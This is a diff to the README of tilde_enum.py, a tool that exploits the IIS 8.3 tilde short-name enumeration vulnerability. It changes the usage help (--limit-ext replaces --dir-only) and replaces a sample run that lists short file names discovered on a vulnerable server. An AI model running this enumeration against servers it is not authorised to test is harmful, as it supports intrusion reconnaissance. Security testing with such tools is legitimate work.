@@ -26,7 +26,7 @@ Help
 <pre>$  ./tilde_enum.py -h
 usage: tilde_enum.py [-h] [-d DIRWORDLIST] [-f] [-o OUT_FILE] [-p PROXY]
                      [-u URL] [-v VERBOSE_LEVEL] [-w WAIT]
-                     [--resume RESUME_STRING] [--dir-only]
+                     [--resume RESUME_STRING] [--limit-ext LIMIT_EXTENSION]
 
 Exploits and expands the file names found from the tilde enumeration vuln
 
@@ -42,69 +42,34 @@ optional arguments:
   -w WAIT               time in seconds to wait between requests
   --resume RESUME_STRING
                         Resume from a given name (length &lt;= 6)
-  --dir-only            Search for directories only
+  --limit-ext LIMIT_EXTENSION
+                        Enumerate for given extension only
 </pre>
 
 
 Sample Output
 ======
 <pre>
-$  ./tilde_enum.py -u http://iis -v 2 -w 0.1 -o output.txt
+$  ./tilde_enum.py -u "http://iis/" -w 0.1 -v 2 --resume=jss --limit-ext=htm
 [-]  Verbose Level=2 ....brace yourself for additional information.
-[-]  Testing with dummy file request http://iis/subdir/SQnxKKN5qE2MS.htm
+[-]  Testing with dummy file request http://iis/MH2GpGp9k44uw.htm
 [-]    URLNotThere -> HTTP Code: 404, Response Length: 1379
-[-]  Testing with user-submitted http://iis/subdir/
-[-]    URLUser -> HTTP Code: 200, Response Length: 7608
-[+]  HTTP Response Codes: {'user_length': 7608, 'not_there_length': 1379, 'user_code': 200, 'not_there_code': 404}
+[-]  Testing with user-submitted http://iis/
+[-]    URLUser -> HTTP Code: 200, Response Length: 46
+[-]  --limit-ext is set. Find names end with given extension only: htm
+[-]  Resume from "jss"... characters before this will be ignored.
 [-]  User-supplied delay detected. Waiting 0.1 seconds between HTTP requests.
+[+]  HTTP Response Codes: {'user_length': 46, 'not_there_length': 1379, 'user_code': 200, 'not_there_code': 404}
 [+]  The server is reporting that it is IIS (Microsoft-IIS/6.0).
-[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..
-[+]  Found file:  cocee6~1.asp
-[+]  Found file:  codeec~1.asp
-[+]  Found file:  cod64a~1.asp
-[+]  Found file:  cod64e~1.asp
-[+]  Found file:  cod642~1.asp
-[+]  Found file:  coe2c8~1.asp
-[+]  Found file:  coe6b4~1.asp
-[+]  counterEnum: http://iis/subdir/conten counter end with ~4.
-[+]  Found file:  conten~1.asp
-[+]  Found file:  conten~2.asp
-[+]  Found file:  conten~3.asp
-[+]  Found file:  conten~4.asp
-[+]  Found file:  co8995~1.asp
-[+]  Found file:  co9999~1.asp
-[+]  counterEnum: http://iis/subdir/flash_ counter end with ~3.
-[+]  Found file:  flash_~1.htm
-[+]  Found file:  flash_~2.htm
-[+]  Found file:  flash_~3.htm
-[+]  Found file:  index~1.asp
-[+]  Found file:  index~1.htm
-[+]  Found file:  login_~1.asp
-[+]  Found file:  menu-s~1.asp
-[+]  Found file:  sso_ch~1.asp
-[-]  Finished doing the 8.3 enumeration for /subdir/.
+[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..
+[+]  counterEnum: jssfhc~1 to ~2.
+[+]  Found file:  jssfhc~1.htm
+[+]  counterEnum: jsstra~1 to ~2.
+[+]  Found file:  jsstra~1.htm
+[-]  Finished doing the 8.3 enumeration for /.
 
 ---------- FINAL OUTPUT ------------------------------
-http://iis/subdir/co8995~1.asp
-http://iis/subdir/co9999~1.asp
-http://iis/subdir/cocee6~1.asp
-http://iis/subdir/cod642~1.asp
-http://iis/subdir/cod64a~1.asp
-http://iis/subdir/cod64e~1.asp
-http://iis/subdir/codeec~1.asp
-http://iis/subdir/coe2c8~1.asp
-http://iis/subdir/coe6b4~1.asp
-http://iis/subdir/conten~1.asp
-http://iis/subdir/conten~2.asp
-http://iis/subdir/conten~3.asp
-http://iis/subdir/conten~4.asp
-http://iis/subdir/flash_~1.htm
-http://iis/subdir/flash_~2.htm
-http://iis/subdir/flash_~3.htm
-http://iis/subdir/index~1.asp
-http://iis/subdir/index~1.htm
-http://iis/subdir/login_~1.asp
-http://iis/subdir/menu-s~1.asp
-http://iis/subdir/sso_ch~1.asp
+http://iis/jssfhc~1.htm
+http://iis/jsstra~1.htm
 ---------- OUTPUT COMPLETE ---------------------------
 </pre>
